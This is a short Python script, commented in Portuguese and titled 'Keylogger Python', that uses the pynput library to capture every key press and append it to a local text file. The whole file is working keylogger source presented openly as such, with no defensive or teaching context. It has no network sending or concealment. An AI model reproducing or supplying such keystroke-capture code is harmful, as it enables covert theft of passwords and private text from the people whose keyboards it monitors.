####################################################################
#                      Keylogger Python                            #
####################################################################

#Importando a biblioteca pynput, e o método Listener.
from pynput.keyboard import Listener

logFile = "Caminho do txt"

def on_press(key):  
    logging = str(key)
    
    with open(logFile, "a") as newlog:
        newlog.write(logging)

with Listener(on_press=on_press) as Listener:
    Listener.join()

